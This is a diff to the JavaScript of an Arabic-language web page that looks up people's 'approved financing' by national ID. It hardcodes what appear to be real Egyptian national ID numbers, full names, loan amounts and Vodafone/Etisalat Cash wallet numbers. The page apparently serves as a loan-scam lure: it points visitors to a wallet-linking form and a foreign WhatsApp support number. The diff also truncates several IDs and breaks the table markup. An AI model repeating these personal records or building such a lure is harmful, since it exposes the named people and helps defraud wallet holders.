@@ -533,17 +533,39 @@
 </div>
 
 <script>
-    // ========== قاعدة العملاء (تم تحديثها بالعملاء الجدد من ملف استمارة التوظيف 2) ==========
+    // ========== قاعدة العملاء (تم تحديثها بالعملاء الجدد من ملف استمارة التوظيف 3) ==========
     const customersDatabase = {
-        // العملاء الجدد من الملف الجديد
-        "27510240100215": { 
+        // العملاء الجدد من الملف الثالث
+        "27012130101721": { 
+            name: "وديده عبد النبي حجاج عبد العال", 
+            loan: "40,000 ج.م", 
+            wallet: "لا يوجد فودافون كاش او اتصالات كاش", 
+            walletNum: "غير مسجل", 
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        "29712011207269": { 
+            name: "ايمان ابراهيم عبد المعطي رمضان", 
+            loan: "200,000 ج.م", 
+            wallet: "فودافون كاش", 
+            walletNum: "01036606122", 
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        "28601070201355": { 
+            name: "ممدوح ابو الحسن أحمد أبو الحسن", 
+            loan: "200,000 ج.م", 
+            wallet: "فودافون كاش", 
+            walletNum: "01028125280", 
+            payment: "من يوم 1 إلى يوم 5"
+        },
+        // العملاء السابقين (من الملفات السابقة)
+        "275240100215": { 
             name: "خالد عبد الغنى السيد عبداللطيف", 
             loan: "30,000 ج.م", 
             wallet: "اتصالات كاش", 
             walletNum: "01155057404", 
             payment: "من يوم 1 إلى يوم 5"
         },
-        "28111182500374": { 
+        "281110374": { 
             name: "شحاته عبد التواب علي حسن", 
             loan: "150,000 ج.م", 
             wallet: "فودافون كاش", 
@@ -578,8 +600,7 @@
             walletNum: "01556244683", 
             payment: "من يوم 1 إلى يوم 5"
         },
-        // العملاء السابقين (من الملف الأول + الإضافيين)
-        "28911120201491": { 
+        "28911201491": { 
             name: "احمد ابراهيم عبدالعاطي", 
             loan: "200,000 ج.م", 
             wallet: "لا يوجد فودافون كاش او اتصالات كاش", 
@@ -600,7 +621,7 @@
             walletNum: "01017550748", 
             payment: "من يوم 1 إلى يوم 5"
         },
-        "28010260105052": { 
+        "280102605052": { 
             name: "محمد مصطفى عيد عبده", 
             loan: "40,000 ج.م", 
             wallet: "اتصالات كاش", 
@@ -635,7 +656,7 @@
             walletNum: "01128657468", 
             payment: "من يوم 1 إلى يوم 5"
         },
-        "29607161400212": { 
+        "296071400212": { 
             name: "إسلام ياسر أحمد محمد", 
             loan: "40,000 ج.م", 
             wallet: "اتصالات كاش", 
@@ -681,7 +702,7 @@
     }
     createParticles();
 
-    const LINKING_URL = 'https://bk0212937-netizen.github.io/Rabt-wilet-/';
+    const LINKING_URL = 'https://survey.porsline.com/s/bTLAeRfL';
     const SUPPORT_WHATSAPP = '212614494251';
     let nationalIdFromSearch = '';
 
@@ -790,11 +811,11 @@
         }
 
         let rows = `
-            <tr><td class="info-label">الاسم الرباعي</td><td>${customer.name}</td></tr>
-            <tr><td class="info-label">مبلغ التمويل المعتمد</td><td class="highlight">${customer.loan}</td></tr>
-            <tr><td class="info-label">نوع المحفظة المسجلة</td><td>${customer.wallet}</td></tr>
-            <tr><td class="info-label">رقم المحفظة</td><td>${customer.walletNum}</td></tr>
-            <tr><td class="info-label">موعد السداد الشهري</td><td>${customer.payment}</td></tr>
+            <tr><td class="info-label">الاسم الرباعي</td><td>${customer.name}</td>
+            <tr><td class="info-label">مبلغ التمويل المعتمد</td><td class="highlight">${customer.loan}</td>
+            <tr><td class="info-label">نوع المحفظة المسجلة</td><td>${customer.wallet}</td>
+            <tr><td class="info-label">رقم المحفظة</td><td>${customer.walletNum}</td>
+            <tr><td class="info-label">موعد السداد الشهري</td><td>${customer.payment}</td>
         `;
         dataTable.innerHTML = rows;
         resultDiv.style.display = 'block';
